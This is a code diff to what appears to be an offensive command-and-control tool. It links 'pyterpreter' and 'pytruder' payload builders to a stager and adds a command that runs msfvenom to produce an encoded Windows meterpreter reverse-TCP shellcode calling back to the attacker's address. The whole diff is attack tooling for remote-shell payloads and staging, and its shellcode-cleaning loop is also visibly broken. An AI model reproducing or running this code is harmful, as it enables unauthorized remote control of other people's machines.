@@ -105,9 +105,9 @@ This command does not require any args.
 '''
 def pyterpreter_generate_function():
     if attacker.public == False:
-        format_pyterpreter(attacker, handler_server)
+        format_pyterpreter(attacker, handler_server, stager)
     elif attacker.public == True:
-        format_pyterpreter(public_machine, handler_server)
+        format_pyterpreter(public_machine, handler_server, stager)
 pyterpreter_generate = lib.command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)
 
 #############################################################################################################################
@@ -122,12 +122,42 @@ This command does not require any args.
 '''
 def pytruder_format_ps1_funciton():
     if attacker.public == False:
-        format_pytruder('ps1', stager)
+        format_pytruder('ps1', attacker)
     elif attacker.public == True:
-        format_pytruder('ps1', stager)
+        format_pytruder('ps1', public_machine)
 pytruder_format_ps1 = lib.command(pytruder_format_help, 'pytruder_format', pytruder_format_ps1_funciton, False)
 
 #############################################################################################################################
+
+################################################ Shell Code Commands ########################################################
+################################################ Shell Code Generate ########################################################
+shellcode_generate_help = '''
+this command generates shellcode based off of already given data, the shell code with be meterpreter
+THis command does no require any args.
+'''
+def shellcode_generate_function():
+    if attacker.public == False:
+        server = attacker
+    elif attacker.public == True:
+        server = public_machine
+    shellcode = os.popen('msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST={} LPORT={} -i 5 -f py'.format(server.ip,input("port metasploit is listening on? $> "))).read()
+    badchars = ['+', '=', 'b""' ',']
+    output = []
+    for char in badchars:
+        shellcode = shellcode.split(char)
+        ''.join(shellcode)
+    shellcode = shellcode.split('\n')
+    for line in shellcode:
+        outline = line[1:]
+        output.append(outline)
+    '\n'.join(output)
+    with open('./stager/shellcode.txt', 'w') as f:
+        f.write(output)
+shellcode_generate = lib.command(shellcode_generate_help, 'shellcode_generate', shellcode_generate_function, False)
+    
+
+##############################################################################################################################
+
 
 def get_attacker_info():
     os.system('ifconfig')
@@ -145,7 +175,7 @@ def get_server_info(attacker, protocol):
     return lib.server(attacker.ip, port, protocol)
 
 
-def format_pyterpreter(attacker, listener):
+def format_pyterpreter(attacker, listener, stager):
     with open('./pyterpreter/pyterpreter.py', 'r') as f:
         output = []
         for line in f:
@@ -166,7 +196,7 @@ def format_pytruder(format, server):
     if not stager:
         print("you need to set up the stager first")
     else:
-        url = "http://{}:{}".format(server.ip, server.port)
+        url = "http://{}:{}".format(server.ip, stager.port)
         if format == 'sh':
             pytruder = './pytruder/pytruder.sh'
         elif format == 'py':
@@ -253,5 +283,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-
 
